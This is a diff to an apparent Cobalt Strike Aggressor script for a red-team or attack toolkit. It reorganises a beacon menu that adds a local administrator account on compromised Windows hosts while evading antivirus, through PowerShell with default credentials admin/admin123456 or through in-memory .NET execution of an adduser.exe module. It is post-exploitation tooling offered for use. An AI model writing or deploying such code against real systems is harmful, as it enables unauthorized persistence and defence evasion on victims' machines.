@@ -4,14 +4,23 @@ sub Adduser{
 }
 
 popup beacon_bottom{
-	item "bypass Av Add User" {
-		$bid = $1;
-		$add = dialog("AddUser", %(username => "admin", password => "admin123456", bid => $bid), &Adduser);
-		dialog_description($add, "绕过杀软进行添加用户\n条件:拥有Administrator权限");
+	menu "&API添加用户"{
+		item "bypass Av Add User(powershell)" {
+			$bid = $1;
+			$add = dialog("AddUser", %(username => "admin", password => "admin123456", bid => $bid), &Adduser);
+			dialog_description($add, "绕过杀软进行添加用户\n条件:拥有Administrator权限");
 
-		drow_text($add, "username", "Username:");
-		drow_text($add, "password", "Password:");
-		dbutton_action($add, "Run");
-		dialog_show($add);
+			drow_text($add, "username", "Username:");
+			drow_text($add, "password", "Password:");
+			dbutton_action($add, "Run");
+			dialog_show($add);
+		}
+		
+		item "bypass Av Add User(.NET assembly Load)"{
+			$bid = $1;
+			foreach $id ($bid){
+				bexecute_assembly($id, getFileProper(script_resource("modules"), "adduser.exe"), "");
+			}
+		}
 	}
 }
